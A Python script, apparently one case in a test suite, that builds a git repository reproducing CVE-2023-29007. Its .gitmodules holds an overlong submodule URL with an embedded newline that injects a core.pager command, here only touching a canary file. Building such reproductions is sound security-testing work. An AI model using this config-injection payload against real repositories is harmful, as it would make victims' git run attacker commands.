"""E4: CVE-2023-29007 — overlong submodule URL injects config.

A submodule URL larger than 1024 chars caused git's config writer to
wrap the line awkwardly, letting attackers inject e.g.
``core.pager=bash`` via a crafted URL. Patched in git ≥ 2.40.1.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402

# Overlong URL with embedded newline that, on vulnerable git, becomes a
# new config section.
URL_PADDING = 'a' * 1100
INJECT = '\n[core]\n\tpager = "touch /canary/PWNED_E4; cat"\n'
GITMODULES = (
    f'[submodule "evil"]\n\tpath = sub\n\turl = https://example.invalid/{URL_PADDING}{INJECT}\n'
).encode()


def main() -> None:
    build_minimal_repo(
        HERE / 'payload',
        config=config_with(''),
        tree_entries=[
            (0o100644, '.gitmodules', GITMODULES),
        ],
    )
    print(f'Built E4 payload at {HERE / "payload"}')


if __name__ == '__main__':
    main()
